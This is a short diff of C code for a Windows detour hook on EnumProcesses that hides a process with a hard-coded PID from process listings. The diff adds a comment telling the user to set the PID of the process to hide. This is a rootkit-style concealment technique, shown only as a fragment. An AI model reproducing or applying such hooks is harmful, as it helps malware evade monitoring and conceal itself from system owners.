@@ -31,6 +31,7 @@ BOOL WINAPI DetourEnumProcesses(DWORD* pProcessIds, DWORD cb, DWORD* pBytesRetur
 
 			// Compare
 			//if (strstr(procName, "chrome.exe") != NULL) {
+			// Replace "1564" with the PID of the process you wish to hide
 			if (pProcessIds[i] == 1564) {
 				badIndex = i;
 				nextIndex = i;
